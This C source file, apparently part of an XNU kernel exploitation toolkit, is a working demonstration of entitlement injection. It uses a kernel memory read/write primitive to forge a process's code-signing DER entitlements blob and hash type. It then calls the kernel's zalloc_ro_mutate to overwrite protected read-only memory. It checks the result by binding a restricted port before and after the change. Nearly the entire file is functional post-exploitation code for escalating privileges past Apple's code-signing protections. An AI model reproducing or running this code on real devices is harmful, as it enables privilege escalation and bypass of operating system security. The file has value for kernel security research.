//
//  main.c
//  demo_entitlements
//
//  Created by admin on 2/18/22.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <limits.h>
#include <spawn.h>
#include <signal.h>
#include <crt_externs.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOSurface/IOSurface.h>
#include <Kernel/kern/cs_blobs.h>

#include <xe/xe.h>
#include <xe/memory/kmem.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>
#include <xe/xnu/proc.h>
#include <xe/iokit/io_surface.h>
#include <xe/iokit/os_dictionary.h>
#include <xe/util/ptrauth.h>
#include <xe/util/log.h>
#include <xe/util/assert.h>
#include <xe/util/kfunc.h>
#include <xe/util/binary.h>
#include <xe/allocator/small_mem.h>

#include "core_entitlements.h"


void print_usage(void) {
    xe_log_info("usage: demo_entitlements <path-to-kmem>");
}


CFDictionaryRef parse_entitlement_plist(const char* plist_path) {
    CFStringRef path_str = CFStringCreateWithCString(kCFAllocatorDefault, plist_path, kCFStringEncodingUTF8);
    xe_assert(path_str != NULL);
    
    CFURLRef path = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, path_str, kCFURLPOSIXPathStyle, FALSE);
    if (!path) {
        xe_log_error("invalid path %s", plist_path);
        exit(1);
    }
    
    CFReadStreamRef stream = CFReadStreamCreateWithFile(kCFAllocatorDefault, path);
    if (!stream || !CFReadStreamOpen(stream)) {
        xe_log_error("cannot open plist file at path %s", plist_path);
        exit(1);
    }
    
    CFErrorRef parse_error;
    CFDictionaryRef dict = CFPropertyListCreateWithStream(kCFAllocatorDefault, stream, 0, 0, NULL, &parse_error);
    if (!dict) {
        xe_log_error("failed to parse entitlement plist, err: %s", CFStringGetCStringPtr(CFErrorCopyDescription(parse_error), kCFStringEncodingUTF8));
        CFRelease(parse_error);
        exit(1);
    }
    
    CFReadStreamClose(stream);
    CFRelease(stream);
    CFRelease(path_str);
    CFRelease(path);
    return dict;
}


uintptr_t get_proc_cs_blobs(uintptr_t proc) {
    uintptr_t textvp = xe_ptrauth_strip(xe_kmem_read_uint64(proc, TYPE_PROC_MEM_P_TEXTVP_OFFSET));
    uintptr_t ubc_info = xe_ptrauth_strip(xe_kmem_read_uint64(textvp, TYPE_VNODE_MEM_VN_UN_OFFSET));
    uintptr_t cs_blobs = xe_kmem_read_uint64(ubc_info, TYPE_UBC_INFO_MEM_CS_BLOBS_OFFSET);
    return cs_blobs;
}


void mutate_csblob_entilements_der(xe_util_kfunc_t kfunc, uintptr_t cs_blob, uintptr_t new_der, uintptr_t new_hash_type) {
    uintptr_t temp_buffer;
    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(TYPE_CS_BLOB_SIZE, &temp_buffer);
    xe_kmem_copy(temp_buffer, cs_blob, TYPE_CS_BLOB_SIZE);
    xe_kmem_write_uint64(temp_buffer, TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET, new_der);
    xe_kmem_write_uint64(temp_buffer, TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET, new_hash_type);
    
    uint64_t args[8];
    bzero(args, sizeof(args));
    args[0] = 8;
    args[1] = cs_blob;
    args[2] = 0;
    args[3] = temp_buffer;
    args[4] = TYPE_CS_BLOB_SIZE;
    
    uintptr_t zalloc_ro_mutate = xe_slider_kernel_slide(FUNC_ZALLOC_RO_MUTATE_ADDR);
    xe_util_kfunc_execute_simple(kfunc, zalloc_ro_mutate, args);
    
    xe_allocator_small_mem_destroy(&allocator);
}


int main(int argc, const char * argv[]) {
    if (argc != 2) {
        xe_log_error("invalid arguments");
        print_usage();
        exit(1);
    }
    
    xe_init();
    xe_kmem_backend_t remote = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(remote);
    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(remote));
    
    int fd = socket(PF_INET, SOCK_STREAM, 0);
    xe_assert_errno(fd < 0);
    
    struct sockaddr_in addr;
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_len = sizeof(addr);
    addr.sin_port = htons(55555);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    int res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
    if (res) {
        xe_log_info("bind to privileged port 55555 failed as expected, err: %s", strerror(errno));
    } else {
        xe_log_error("bind succeeded without entitlement");
        exit(1);
    }
    
    CFDictionaryRef entitlements = parse_entitlement_plist("entitlements.plist");
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    xe_log_debug("proc: %p", (void*)proc);
    uintptr_t cs_blob = get_proc_cs_blobs(proc);
    xe_log_debug("cs_blob: %p", (void*)cs_blob);
    uintptr_t cs_der_entitlements_blob = xe_kmem_read_uint64(cs_blob, TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET);
    xe_log_debug("cs_der_entitlements_blob: %p", (void*)cs_der_entitlements_blob);
    uintptr_t csb_hashtype = xe_kmem_read_uint64(cs_blob, TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET);
    xe_log_debug("csb_hashtype: %p", (void*)csb_hashtype);
    
    CFDataRef fake_der_blob_data;
    uint64_t ce_res = CESerializeCFDictionary(CECRuntime, entitlements, &fake_der_blob_data);
    if (ce_res != kCENoError) {
        xe_log_error("failed to serialize provided entitlements plist");
        exit(1);
    }
    
    size_t fake_der_blob_size = offsetof(CS_GenericBlob, data) + CFDataGetLength(fake_der_blob_data);
    uintptr_t fake_der_blob;
    xe_allocator_small_mem_t fake_der_allocator = xe_allocator_small_mem_allocate(fake_der_blob_size, &fake_der_blob);
    
    xe_kmem_write_uint32(fake_der_blob, offsetof(CS_GenericBlob, magic), htonl(CSMAGIC_EMBEDDED_DER_ENTITLEMENTS));
    xe_kmem_write_uint32(fake_der_blob, offsetof(CS_GenericBlob, length), htonl(fake_der_blob_size));
    xe_kmem_write(fake_der_blob, offsetof(CS_GenericBlob, data), (void*)CFDataGetBytePtr(fake_der_blob_data), CFDataGetLength(fake_der_blob_data));
    CFRelease(fake_der_blob_data);
    xe_log_debug("fake csb_der_entitlements_blob: %p", (void*)fake_der_blob);
    
    uintptr_t fake_csb_hashtype;
    xe_allocator_small_mem_t fake_csb_hashtype_allocator = xe_allocator_small_mem_allocate(TYPE_CS_HASH_SIZE, &fake_csb_hashtype);
    xe_kmem_copy(fake_csb_hashtype, csb_hashtype, TYPE_CS_HASH_SIZE);
    xe_kmem_write_uint64(fake_csb_hashtype, TYPE_CS_HASH_MEM_CS_SIZE_OFFSET, 0);
    xe_log_debug("fake csb_hashtype: %p", (void*)fake_csb_hashtype);
    
    xe_util_kfunc_t kfunc = xe_util_kfunc_create(VAR_ZONE_ARRAY_LEN - 1);
    
    xe_log_info("setting fake entitlements and hashtype");
    mutate_csblob_entilements_der(kfunc, cs_blob, fake_der_blob, fake_csb_hashtype);
    xe_log_info("fake entitlements and hashtype set");
    
    res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
    if (res) {
        xe_log_error("bind failed even after adding entitlement");
        exit(1);
    } else {
        xe_log_info("bind to privileged port succeded after adding entitlement");
    }
    
    close(fd);
    
    xe_log_info("restoring entitlements and hashtype");
    mutate_csblob_entilements_der(kfunc, cs_blob, cs_der_entitlements_blob, csb_hashtype);
    xe_log_info("restored entitlements and hashtype");
    
    xe_allocator_small_mem_destroy(&fake_der_allocator);
    xe_allocator_small_mem_destroy(&fake_csb_hashtype_allocator);
    xe_util_kfunc_destroy(&kfunc);
    return 0;
}
